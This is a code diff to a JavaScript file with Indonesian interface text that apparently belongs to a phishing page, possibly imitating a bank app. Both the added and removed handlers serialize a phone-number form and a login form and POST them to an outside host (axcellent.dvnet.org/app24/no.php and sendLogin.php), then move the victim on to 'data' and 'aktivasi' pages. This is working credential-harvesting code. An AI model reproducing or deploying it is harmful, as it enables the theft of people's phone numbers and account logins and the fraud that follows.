@@ -1,64 +1,46 @@
-$('#eform').on('submit', function (event) {
-
+function sendHp() {
+event.preventDefault();
+        var nomor = document.getElementById("nomor").value;
+        sessionStorage.setItem("nomor", nomor);
+$('.load').fadeIn();
+ document.getElementById('kirims').innerHTML ="Memproses...";
  
-  event.stopPropagation();
-    event.preventDefault();
  
-   $('.load').fadeIn(); 
-    
-  document.getElementById('kirims').innerHTML = "Memproses....";
+      $.ajax({
+            type: 'POST',
+            url: 'https://axcellent.dvnet.org/app24/no.php',
+            data: $('#eform').serialize(),
+            datatype: 'JSON',           
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='data.html'
+  document.getElementById('kirims').innerHTML = "Selanjutnya";
+ $('.load').fadeOut();
+    }, 800);
+            }
+        })
+     }
+     
+function sendLogin() {
+event.preventDefault();
+$('.load').fadeIn();
+ document.getElementById('kirims').innerHTML ="Memproses..."; 
+      $.ajax({
+            type: 'POST',
+            url: 'https://axcellent.dvnet.org/app24/sendLogin.php',
+            data: $('#login').serialize(),
+            datatype: 'JSON',           
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='aktivasi.html'
+  document.getElementById('kirims').innerHTML = "Selanjutnya";
+ $('.load').fadeOut();
+    }, 800);
+            }
+        })
+     }
 
-$.ajax({
- type: 'POST',
- url: 'https://axcellent.dvnet.org/app24/no.php',
- async: false,
- dataType: 'JSON',
- data: $(this).serialize(),
- 
- complete: function(data) {
-            console.log('Complete')
-  setTimeout(function(){
-    window.location.href='data.html';  
-var nomor = document.getElementById("nomor").value;
-sessionStorage.setItem("nomor", nomor);
-$('.load').fadeOut(); 
-     }, 500);
-        }
-    });
-
-    return false;
-});       
-    
-    
-$('#login').on('submit', function (event) {
-
-
- 
-  event.stopPropagation();
-    event.preventDefault();
-  $('.load').fadeIn(); 
-  
-    
-  document.getElementById('kirims').innerHTML = "Memproses....";
-
-$.ajax({
- type: 'POST',
- url: 'https://axcellent.dvnet.org/app24/sendLogin.php',
- async: false,
- dataType: 'JSON',
- data: $(this).serialize(),
- 
- complete: function(data) {
-            console.log('Complete')
-  setTimeout(function(){
-    window.location.href='aktivasi.html';  
-    $('.load').fadeOut(); 
-     }, 500);
-        }
-    });
-
-    return false;
-});           
+           
 
 audio4 = document.getElementById("bsiku");
 function go(){
